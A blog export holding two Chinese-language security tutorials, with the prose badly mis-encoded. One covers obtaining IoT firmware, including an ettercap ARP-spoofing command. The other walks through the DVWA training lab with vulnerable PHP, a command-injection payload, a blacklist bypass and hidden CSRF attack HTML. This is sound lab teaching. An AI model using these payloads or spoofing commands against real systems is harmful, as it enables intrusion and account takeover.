ç§æ–¹æ³•","slug":"è·å–å›ºä»¶","date":"2019-07-24T03:49:28.000Z","updated":"2021-04-10T13:33:17.285Z","comments":true,"path":"2019/07/24/è·å–å›ºä»¶/","link":"","permalink":"https://cool-y.github.io/2019/07/24/è·å–å›ºä»¶/","excerpt":"","text":"é€šè¿‡åˆ†æç‰©è”ç½‘è®¾å¤‡é­å—æ”»å‡»çš„é“¾æ¡å¯ä»¥å‘ç°ï¼Œé»‘å®¢è·å–å›ºä»¶ï¼ŒæŠŠå›ºä»¶é€†å‘æˆæ±‡ç¼–æˆ–Cç¨‹åºè¯­è¨€åï¼Œèƒ½åˆ†æå‡ºè®¾å¤‡çš„è¿è¡Œæµç¨‹å’Œç½‘ç»œè¡Œä¸ºï¼Œè¿˜èƒ½æ‰¾åˆ°å®‰å…¨åŠ å¯†ç›¸å…³çš„å¯†é’¥ç›¸å…³çš„ä¿¡æ¯ã€‚å¦‚æœè¿™äº›â€œæœ‰å¿ƒäººâ€æ²¡èƒ½è·å–åˆ°å›ºä»¶ä¿¡æ¯ï¼Œä»–ä»¬ä¹Ÿå¾ˆéš¾å‘ç°è¿™äº›æ¼æ´ã€‚ä»è¿™ä¸€ç‚¹çœ‹ï¼Œç‰©è”ç½‘è®¾å¤‡çš„å®‰å…¨æ€§ï¼Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå†³å®šäºå…¶å›ºä»¶çš„å®‰å…¨æ€§ã€‚ http://blog.nsfocus.net/security-analysis-of-the-firmware-of-iot/https://open.appscan.io/article-1163.html å®˜ç½‘è·å–æˆ–è”ç³»å”®åç´¢å–å‡çº§åŒ…ç½‘ç»œå‡çº§æ‹¦æˆªå·¥å…·ï¼šwiresharkã€ettercapæµç¨‹ï¼šä¸­é—´äºº-&gt;å¼€å§‹æŠ“åŒ…-&gt;åœ¨çº¿å‡çº§-&gt;åˆ†æå›ºä»¶åœ°å€-&gt;ä¸‹è½½æ¡ˆä¾‹ï¼šåä¸ºè·¯ç”±WS5200 å››æ ¸ç‰ˆè¿™æ¬¾è·¯ç”±å™¨åœ¨ç½‘ä¸Šæ‰¾ä¸åˆ°ç°æœ‰å›ºä»¶ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥é€šè¿‡æŠ“åŒ…åœ¨çº¿å‡çº§è¿‡ç¨‹è·å–å›ºä»¶ã€‚é¦–å…ˆå…³é—­é˜²ç«å¢™ï¼Œå¦åˆ™æ— æ³•è®¿é—®è·¯ç”±å™¨çš„æœåŠ¡ï¼Œæ— æ³•åšä¸­é—´äººæ”»å‡»ã€‚ä½¿ç”¨ettercapè¿›è¡Œarpæ¬ºéª—ï¼Œsudo ettercap -Tq -i ens33 -M arp:remote /192.168.31.1// /192.168.31.134//æ‰“å¼€wiresharkè¿›è¡ŒæŠ“åŒ…ã€‚ç†è®ºä¸Šè¯´ï¼Œç‚¹å‡»å‡çº§å›ºä»¶ä¹‹åï¼Œwiresharkå°±èƒ½å¤Ÿè®°å½•å‡çº§å›ºä»¶çš„æ•´ä¸ªè¿‡ç¨‹(HTTP),ä½†æ˜¯ç»“æœå´å¹¶ä¸ç†æƒ³ã€‚ è¿˜å¥½åä¸ºè·¯ç”±å™¨è‡ªå¸¦äº†æŠ“åŒ…çš„åŠŸèƒ½ï¼ˆæ–¹ä¾¿åæœŸçš„è°ƒè¯•å’Œç»´æŠ¤ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½æŠ“å–æŠ¥æ–‡ï¼Œæ¯”åšä¸­é—´äººè¦ç›´æ¥äº†å½“å¾—å¤šã€‚ åœ¨ç‚¹å‡»å‡çº§å›ºä»¶ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¤§é‡å‘å¾€58.49.156.104è¿™ä¸ªåœ°å€çš„æŠ¥æ–‡ï¼ŒçŒœæµ‹ææœ‰å¯èƒ½æ˜¯åä¸ºçš„æœåŠ¡å™¨ï¼Œè¿‡æ»¤ä¸€ä¸‹ä¼šçœ‹å¾—æ›´æ¸…æ¥šå¯ä»¥çœ‹åˆ°åœ¨é€šè¿‡ä¸‰æ¬¡TCPæ¡æ‰‹ä¹‹åï¼Œåä¸ºè·¯ç”±å™¨å‘æœåŠ¡å™¨å‘é€äº†getè¯·æ±‚ï¼Œuriå°±æ˜¯è·å–å›ºä»¶çš„åœ°å€ http://update.hicloud.com/TDS/data/files/p14/s145/G4404/g1810/v272964/f1/WS5200_10.0.2.7_main.binç‚¹å‡»å³å¯æ‹¿åˆ°æœ€æ–°çš„å›ºä»¶ æ¡ˆä¾‹ï¼šå°ç±³æ™ºèƒ½é—¨é”http://cdn.cnbj0.fds.api.mi-img.com/miio_fw/250cc495d7da7643680dadeab578fce0_upd_lumi.lock.mcn01.bin?GalaxyAccessKeyId=5721718224520&amp;Expires=1566136387000&amp;Signature=KLOrbsRANlJD7w7bKB03xI1t4/0= ./storage/emulated/0/Android/data/com.xiaomi.smarthome/cache/ble/250cc495d7da7643680dadeab578fce0_upd_lumi.lock.mcn01.bin 123456$ binwalk -Me 250cc495d7da7643680dadeab578fce0_upd_lumi.lock.mcn01.binScan Time: 2019-07-20 20:01:40Target File: /home/han/ck/iot/250cc495d7da7643680dadeab578fce0_upd_lumi.lock.mcn01.binMD5 Checksum: 250cc495d7da7643680dadeab578fce0Signatures: 390 é€šè¿‡ä¸²å£è¯»å–å·¥å…·ï¼šuartè½¬usbæµç¨‹ï¼šæ‰¾åˆ°ç”µè·¯æ¿ä¸Šçš„uartæ¥å£ï¼ˆRXã€TXã€+5vã€GNDï¼‰-&gt;ä¸²å£é€šä¿¡-&gt;æ‹¿åˆ°shell-&gt;taræ‰“åŒ…å›ºä»¶-&gt;ncä¼ è¾“æ¡ˆä¾‹ï¼šå°çˆ±éŸ³å“ åˆ·å¼€å‘æ¿å›ºä»¶ï¼Œå¼€å¯sshæœåŠ¡æœ‰äº›å‚å•†é™¤äº†ç¨³å®šç‰ˆå›ºä»¶ï¼Œè¿˜ä¼šæä¾›å¼€å‘ç‰ˆä¾›å‘çƒ§å‹â€œç©å¼„â€ã€‚æ¡ˆä¾‹ï¼šå°ç±³è·¯ç”±å™¨çš„å¼€å‘æ¿å¯é€šè¿‡å®‰è£…sshå·¥å…·åŒ…å¼€å¯sshæœåŠ¡æµç¨‹ï¼šå¼€å¯ssh-&gt;taræ‰“åŒ…å›ºä»¶12345678910111213141516171819202122232425262728root@XiaoQiang:/# lsbin data dev etc extdisks lib mnt opt overlay proc readonly rom root sbin sys tmp userdisk usr var wwwå‹ç¼©æç¤ºæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´root@XiaoQiang:/# tar -zcf bin.tar.gz bin/*tar: can&apos;t open &apos;bin.tar.gz&apos;: No space left on deviceæ¥çœ‹ä¸€ä¸‹ç©ºé—´ä½¿ç”¨æƒ…å†µroot@XiaoQiang:/# df -hFilesystem Size Used Available Use% Mounted onrootfs 25.9M 25.9M 0 100% /none 60.5M 4.5M 56.0M 7% /devtmpfs 60.9M 1.5M 59.4M 2% /tmpubi0_0 25.9M 25.9M 0 100% /tmpfs 60.9M 1.5M 59.4M 2% /tmptmpfs 60.9M 1.5M 59.4M 2% /extdisksubi1_0 45.4M 6.7M 36.3M 16% /dataubi1_0 45.4M 6.7M 36.3M 16% /userdiskubi0_0 25.9M 25.9M 0 100% /userdisk/dataubi1_0 45.4M 6.7M 36.3M 16% /etc/devç›®å½•ä¸‹è¿˜æœ‰è¶³å¤Ÿç©ºé—´ï¼Œç»§ç»­å‹ç¼©root@XiaoQiang:/# tar -zcf ./dev/bin.tar.gz bin/*root@XiaoQiang:/# tar -zcf ./dev/data.tar.gz data/*å…¶ä»–çš„ç›®å½•ä¹Ÿæ˜¯ä¸€æ ·çš„æ–¹æ³•scpä¼ è¾“åˆ°æœ¬åœ°scp root:password@miwifi:/dev/*.tar.gz ./Desktop ubootæå–å›ºä»¶æ¡ˆä¾‹ï¼š2018å¹´çœ‹é›ªæä¾›çš„æ‘„åƒå¤´ é€šè¿‡è°ƒè¯•æ¥å£JTAG/SWDæ‹†å­˜å‚¨ï¼ˆflashã€SDå¡ã€ç¡¬ç›˜ç­‰ï¼‰ï¼Œç”¨ç¼–ç¨‹å™¨æˆ–è¯»å¡å™¨è·å–é€»è¾‘åˆ†æä»ª","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"IoT","slug":"IoT","permalink":"https://cool-y.github.io/tags/IoT/"},{"name":"ç¡¬ä»¶å±‚","slug":"ç¡¬ä»¶å±‚","permalink":"https://cool-y.github.io/tags/ç¡¬ä»¶å±‚/"}]},{"title":"DVWAé»‘å®¢æ”»é˜²å¹³å°","slug":"web-dvwa","date":"2019-07-24T03:46:51.000Z","updated":"2021-04-10T13:48:51.989Z","comments":true,"path":"2019/07/24/web-dvwa/","link":"","permalink":"https://cool-y.github.io/2019/07/24/web-dvwa/","excerpt":"","text":"æ­å»ºç¯å¢ƒæœ€å¥½ä½¿ç”¨dockeræ¥æ­å»ºï¼Œæ–¹ä¾¿è¿ç§» https://hub.docker.com/r/vulnerables/web-dvwa/ æš´åŠ›ç ´è§£easyæ¨¡å¼ å¯†ç ç ´è§£æ˜¯ä»å­˜å‚¨åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­æˆ–ç”±è®¡ç®—æœºç³»ç»Ÿä¼ è¾“çš„æ•°æ®ä¸­æ¢å¤å¯†ç çš„è¿‡ç¨‹ã€‚ä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯åå¤å°è¯•å¯†ç çš„çŒœæµ‹ã€‚ç”¨æˆ·ç»å¸¸é€‰æ‹©å¼±å¯†ç ã€‚ä¸å®‰å…¨é€‰æ‹©çš„ä¾‹å­åŒ…æ‹¬åœ¨è¯å…¸ä¸­æ‰¾åˆ°çš„å•ä¸ªå•è¯ï¼Œå§“æ°ï¼Œä»»ä½•å¤ªçŸ­çš„å¯†ç ï¼ˆé€šå¸¸è¢«è®¤ä¸ºå°‘äº6æˆ–7ä¸ªå­—ç¬¦ï¼‰ï¼Œæˆ–å¯é¢„æµ‹çš„æ¨¡å¼ï¼ˆä¾‹å¦‚äº¤æ›¿çš„å…ƒéŸ³å’Œè¾…éŸ³ï¼Œè¿™è¢«ç§°ä¸ºleetspeakï¼Œæ‰€ä»¥â€œå¯†ç â€œå˜æˆâ€p @ 55w0rdâ€œï¼‰ã€‚åˆ›å»ºé’ˆå¯¹ç›®æ ‡ç”Ÿæˆçš„ç›®æ ‡å•è¯åˆ—è¡¨é€šå¸¸ä¼šæä¾›æœ€é«˜çš„æˆåŠŸç‡ã€‚æœ‰ä¸€äº›å…¬å…±å·¥å…·å¯ä»¥æ ¹æ®å…¬å¸ç½‘ç«™ï¼Œä¸ªäººç¤¾äº¤ç½‘ç»œå’Œå…¶ä»–å¸¸è§ä¿¡æ¯ï¼ˆå¦‚ç”Ÿæ—¥æˆ–æ¯•ä¸šå¹´ä»½ï¼‰çš„ç»„åˆåˆ›å»ºå­—å…¸ã€‚æœ€åä¸€ç§æ–¹æ³•æ˜¯å°è¯•æ‰€æœ‰å¯èƒ½çš„å¯†ç ï¼Œç§°ä¸ºæš´åŠ›æ”»å‡»ã€‚ä»ç†è®ºä¸Šè®²ï¼Œå¦‚æœå°è¯•æ¬¡æ•°æ²¡æœ‰é™åˆ¶ï¼Œé‚£ä¹ˆæš´åŠ›æ”»å‡»å°†æ°¸è¿œæ˜¯æˆåŠŸçš„ï¼Œå› ä¸ºå¯æ¥å—å¯†ç çš„è§„åˆ™å¿…é¡»æ˜¯å…¬å¼€çš„;ä½†éšç€å¯†ç é•¿åº¦çš„å¢åŠ ï¼Œå¯èƒ½çš„å¯†ç æ•°é‡ä¹Ÿè¶Šæ¥è¶Šé•¿ã€‚ ä½¿ç”¨burpsuiteå¯ç ´ä¹‹ï¼ŒBurp suiteè¿è¡Œåï¼ŒProxy å¼€èµ·é»˜è®¤çš„8080 ç«¯å£ä½œä¸ºæœ¬åœ°ä»£ç†æ¥å£ã€‚ä½¿ç”¨Burp suiteé€šè¿‡ç½®ä¸€ä¸ªweb æµè§ˆå™¨ä½¿ç”¨å…¶ä»£ç†æœåŠ¡å™¨123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"; echo \"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"; &#125; else &#123; // Login failed echo \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);&#125;?&gt; PHP $_GET å˜é‡åœ¨ PHP ä¸­ï¼Œé¢„å®šä¹‰çš„ $_GET å˜é‡ç”¨äºæ”¶é›†æ¥è‡ª method=â€getâ€ çš„è¡¨å•ä¸­çš„å€¼ã€‚ $_GET å˜é‡é¢„å®šä¹‰çš„ $_GET å˜é‡ç”¨äºæ”¶é›†æ¥è‡ª method=â€getâ€ çš„è¡¨å•ä¸­çš„å€¼ã€‚ä»å¸¦æœ‰ GET æ–¹æ³•çš„è¡¨å•å‘é€çš„ä¿¡æ¯ï¼Œå¯¹ä»»ä½•äººéƒ½æ˜¯å¯è§çš„ï¼ˆä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„åœ°å€æ ï¼‰ï¼Œå¹¶ä¸”å¯¹å‘é€ä¿¡æ¯çš„é‡ä¹Ÿæœ‰é™åˆ¶ã€‚ ä½•æ—¶ä½¿ç”¨ method=â€getâ€ï¼Ÿåœ¨ HTML è¡¨å•ä¸­ä½¿ç”¨ method=â€getâ€ æ—¶ï¼Œæ‰€æœ‰çš„å˜é‡åå’Œå€¼éƒ½ä¼šæ˜¾ç¤ºåœ¨ URL ä¸­ã€‚æ‰€ä»¥åœ¨å‘é€å¯†ç æˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œä¸åº”è¯¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼ç„¶è€Œï¼Œæ­£å› ä¸ºå˜é‡æ˜¾ç¤ºåœ¨ URL ä¸­ï¼Œå› æ­¤å¯ä»¥åœ¨æ”¶è—å¤¹ä¸­æ”¶è—è¯¥é¡µé¢ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚HTTP GET æ–¹æ³•ä¸é€‚åˆå¤§å‹çš„å˜é‡å€¼ã€‚å®ƒçš„å€¼æ˜¯ä¸èƒ½è¶…è¿‡ 2000 ä¸ªå­—ç¬¦çš„ã€‚ 12345678910GET /vulnerabilities/brute/?username=admin123&amp;password=123&amp;Login=Login HTTP/1.1Host: 192.168.31.84:81Proxy-Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://192.168.31.84:81/vulnerabilities/brute/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=rbb91verhfhas5a6k7tq77bmo4; security=low æˆ‘ä»¬å¯ä»¥çœ‹åˆ°usernameå’Œpasswordæ˜¯ä»¥æ˜æ–‡å‡ºç°ï¼Œå¯ä»¥ä¿®æ”¹ã€‚ å°†è¯·æ±‚è¿›è¡Œæäº¤åˆ°intruderæ¨¡å—ï¼Œåœ¨é‚£é‡Œå¯ä»¥æŠŠpasswordè®¾ç½®ä¸ºæˆ‘ä»¬ç ´è§£çš„payload.ç‚¹å‡»Start attack~ç„¶åå°±æ ¹æ®å¯¹é¢è¿”å›åŒ…çš„å¤§å°ï¼ŒçŸ¥é“å¯†ç ï¼Œâ€™passwordâ€™è¿”å›çš„é•¿åº¦æ›´é•¿ mediumæ¨¡å¼ä»£ç ä¸å‰é¢ç›¸æ¯”åªæ˜¯å¤šäº†è¦ç”¨mysqli_real_escape_stringå‡½æ•°è¿›è¡ŒéªŒè¯ï¼Œä»¥åŠç™»å½•å¤±è´¥ä¼š sleep(2)ã€‚å°†ç”¨æˆ·åå’Œå¯†ç è½¬ä¹‰ï¼Œæ¯”å¦‚è¯´ \\n è¢«è½¬ä¹‰æˆ \\nï¼Œâ€™ è½¬ä¹‰æˆ \\â€™ï¼Œè¿™å¯ä»¥æŠµå¾¡ä¸€äº› SQL æ³¨å…¥æ”»å‡»ï¼Œä½†æ˜¯ä¸èƒ½æŠµå¾¡çˆ†ç ´ã€‚ å‘½ä»¤æ‰§è¡Œeasyæ¨¡å¼ å‘½ä»¤æ³¨å…¥æ”»å‡»çš„ç›®çš„æ˜¯åœ¨æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä¸­æ³¨å…¥å’Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‰§è¡Œä¸éœ€è¦çš„ç³»ç»Ÿå‘½ä»¤çš„åº”ç”¨ç¨‹åºå°±åƒä¸€ä¸ªä¼ªç³»ç»Ÿshellï¼Œæ”»å‡»è€…å¯ä»¥å°†å®ƒç”¨ä½œä»»ä½•æˆæƒçš„ç³»ç»Ÿç”¨æˆ·ã€‚ä½†æ˜¯ï¼Œå‘½ä»¤çš„æ‰§è¡Œå…·æœ‰ä¸WebæœåŠ¡ç›¸åŒçš„æƒé™å’Œç¯å¢ƒã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå‘½ä»¤æ³¨å…¥æ”»å‡»æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºç¼ºå°‘æ­£ç¡®çš„è¾“å…¥æ•°æ®éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµå®ƒï¼ˆè¡¨å•ï¼Œcookieï¼ŒHTTPå¤´ç­‰ï¼‰ã€‚ æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰ï¼ˆä¾‹å¦‚Linuxå’ŒWindowsï¼‰çš„è¯­æ³•å’Œå‘½ä»¤å¯èƒ½ä¸åŒï¼Œå…·ä½“å–å†³äºæ‰€éœ€çš„æ“ä½œã€‚ æ­¤æ”»å‡»ä¹Ÿå¯ç§°ä¸ºâ€œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰â€ã€‚ 123456789101112131415161718192021&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo \"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;\";&#125;?&gt; å¯è§ï¼ŒæœåŠ¡å™¨æ— æ¡ä»¶æ‰§è¡Œäº†ping $targetçš„å‘½ä»¤ï¼Œå¦‚æœæ³¨å…¥$target = 0 | dirï¼ŒæœåŠ¡å™¨å°±ä¼šæ‰§è¡Œdir ç®¡é“ç¬¦å·ï¼Œæ˜¯unixä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½,ç¬¦å·ä¸ºä¸€æ¡ç«–çº¿:â€|â€ã€‚ç”¨æ³•: command 1 | command 2 ä»–çš„åŠŸèƒ½æ˜¯æŠŠç¬¬ä¸€ä¸ªå‘½ä»¤command 1æ‰§è¡Œçš„ç»“æœä½œä¸ºcommand 2çš„è¾“å…¥ä¼ ç»™command 2 ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ä¿®è¡¥åŠæ³•åœ¨å†™ç¨‹åºæ—¶å°½é‡åœ°ä½¿å˜é‡ä¸èƒ½è¢«ç”¨æˆ·æ‰€æ§åˆ¶ï¼ä¸”æ³¨æ„å˜é‡åˆå§‹åŒ–çš„é—®é¢˜ã€‚ ä½¿ç”¨str_replaceå¯¹â€œ%â€ï¼Œâ€|â€,â€œ&gt;â€è¿›è¡Œæ›¿æ¢ è¿›å…¥å‡½æ•°å‰åˆ¤æ–­å˜é‡æ˜¯å¦åˆæ³•ã€‚ mediumæ¨¡å¼æ— éå°±æ˜¯å¢åŠ äº†ä¸€ä¸ªé»‘åå• &amp;&amp;å’Œï¼›ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç”¨ç®¡é“|å’Œ&amp;12345// Set blacklist$substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;,); è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯â€&amp;&amp;â€ä¸â€&amp;â€çš„åŒºåˆ«ï¼šCommand 1&amp;&amp;Command 2å…ˆæ‰§è¡ŒCommand 1ï¼Œæ‰§è¡ŒæˆåŠŸåæ‰§è¡ŒCommand 2ï¼Œå¦åˆ™ä¸æ‰§è¡ŒCommand 2Command 1&amp;Command 2å…ˆæ‰§è¡ŒCommand 1ï¼Œä¸ç®¡æ˜¯å¦æˆåŠŸï¼Œéƒ½ä¼šæ‰§è¡ŒCommand 2 æ›´èªæ˜çš„åšæ³•æ˜¯åˆ©ç”¨&amp;;&amp;ï¼Œé»‘åå•ä¼šå°†å…¶è½¬åŒ–ä¸º&amp;&amp; CSRFeasyæ¨¡å¼ CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ æ˜¯ä¸€ç§æ”»å‡»ï¼Œå®ƒå¼ºåˆ¶ç»ˆç«¯ç”¨æˆ·åœ¨å½“å‰å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œä¸éœ€è¦çš„æ“ä½œã€‚åœ¨ç¤¾äº¤å·¥ç¨‹çš„å¸®åŠ©ä¸‹ï¼ˆä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶/èŠå¤©å‘é€é“¾æ¥ï¼‰ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå¼ºåˆ¶Webåº”ç”¨ç¨‹åºçš„ç”¨æˆ·æ‰§è¡Œæ”»å‡»è€…é€‰æ‹©çš„æ“ä½œã€‚æˆåŠŸçš„CSRFåˆ©ç”¨å¯èƒ½ä¼šæŸå®³æœ€ç»ˆç”¨æˆ·æ•°æ®å’Œæ™®é€šç”¨æˆ·çš„æ“ä½œã€‚å¦‚æœç›®æ ‡æœ€ç»ˆç”¨æˆ·æ˜¯ç®¡ç†å‘˜å¸æˆ·ï¼Œåˆ™å¯èƒ½ä¼šå±åŠæ•´ä¸ªWebåº”ç”¨ç¨‹åºã€‚æ­¤æ”»å‡»ä¹Ÿå¯ç§°ä¸ºâ€œXSRFâ€ï¼Œç±»ä¼¼äºâ€œè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰â€ï¼Œå®ƒä»¬é€šå¸¸ä¸€èµ·ä½¿ç”¨ã€‚æ‚¨çš„ä»»åŠ¡æ˜¯è®©å½“å‰ç”¨æˆ·ä½¿ç”¨CSRFæ”»å‡»æ›´æ”¹è‡ªå·±çš„å¯†ç ï¼Œè€Œæ— éœ€ä»–ä»¬äº†è§£è‡ªå·±çš„æ“ä½œã€‚ 1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ 'Change' ] ) ) &#123; // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; &#125; else &#123; // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);&#125;?&gt; æœåŠ¡å™¨é€šè¿‡GETæ–¹å¼æ¥æ”¶ä¿®æ”¹å¯†ç çš„è¯·æ±‚ï¼Œä¼šæ£€æŸ¥å‚æ•°password_newä¸password_confæ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œå°±ä¼šä¿®æ”¹å¯†ç ï¼Œæ²¡æœ‰ä»»ä½•çš„é˜²CSRFæœºåˆ¶ï¼ˆå½“ç„¶æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å‘é€è€…æ˜¯åšäº†èº«ä»½éªŒè¯çš„ï¼Œæ˜¯æ£€æŸ¥çš„cookieï¼Œåªæ˜¯è¿™é‡Œçš„ä»£ç æ²¡æœ‰ä½“ç°ï¼‰ã€‚ 12345678910GET /vulnerabilities/csrf/?password_new=123&amp;password_conf=123456&amp;Change=Change HTTP/1.1Host: 192.168.31.84:81Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://192.168.31.84:81/vulnerabilities/csrf/?password_new=password&amp;password_conf=123&amp;Change=ChangeAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=rbb91verhfhas5a6k7tq77bmo4; security=lowConnection: close æ ¹æ®æ‹¦æˆªçš„httpè¯·æ±‚ï¼Œå¯ä»¥ä¼ªé€ å¦‚ä¸‹é“¾æ¥è®©å—å®³è€…ç‚¹å‡»ï¼Œä»è€Œä¿®æ”¹å¯†ç http://ip:port/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change æ›´å…·éšè—æ€§çš„æ–¹å¼ï¼š1.ä½¿ç”¨çŸ­é“¾æ¥æ¥éšè— URLï¼šä¸ºäº†æ›´åŠ éšè”½ï¼Œå¯ä»¥ç”ŸæˆçŸ­ç½‘å€é“¾æ¥ï¼Œç‚¹å‡»çŸ­é“¾æ¥ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°çœŸå®ç½‘ç«™ï¼šhttp://tinyurl.com/yd2gogtvPS:æä¾›ä¸€ä¸ªçŸ­ç½‘å€ç”Ÿæˆç½‘ç«™2.æ„é€ æ”»å‡»é¡µé¢ï¼š æ–¹å¼ 1 é€šè¿‡imgæ ‡ç­¾ä¸­çš„srcå±æ€§æ¥åŠ è½½CSRFæ”»å‡»åˆ©ç”¨çš„URLï¼Œå¹¶è¿›è¡Œå¸ƒå±€éšè—ï¼Œå®ç°äº†å—å®³è€…ç‚¹å‡»é“¾æ¥åˆ™ä¼šå°†å¯†ç ä¿®æ”¹ã€‚ æ–¹å¼ 2 æŸ¥çœ‹é¡µé¢htmlæºä»£ç ï¼Œå°†å…³äºå¯†ç æ“ä½œçš„è¡¨å•éƒ¨åˆ†ï¼Œé€šè¿‡javascriptçš„onloadäº‹ä»¶åŠ è½½å’Œcssä»£ç æ¥éšè—å¸ƒå±€ï¼ŒæŒ‰GETä¼ é€’å‚æ•°çš„æ–¹å¼ï¼Œè¿›ä¸€æ­¥æ„é€ html formè¡¨å•ï¼Œå®ç°äº†å—å®³è€…ç‚¹å‡»é“¾æ¥åˆ™ä¼šå°†å¯†ç ä¿®æ”¹ã€‚1234567891011121314151617181920&lt;body onload=\"javascript:csrf()\"&gt;&lt;script&gt;function csrf()&#123;document.getElementById(\"button\").click();&#125;&lt;/script&gt;&lt;style&gt;form&#123;display:none;&#125;&lt;/style&gt; &lt;form action=\"http://www.dvwa.com/vulnerabilities/csrf/?\" method=\"GET\"&gt; New password:&lt;br /&gt; &lt;input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_new\" value=\"test\"&gt;&lt;br /&gt; Confirm new password:&lt;br /&gt; &lt;input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\" 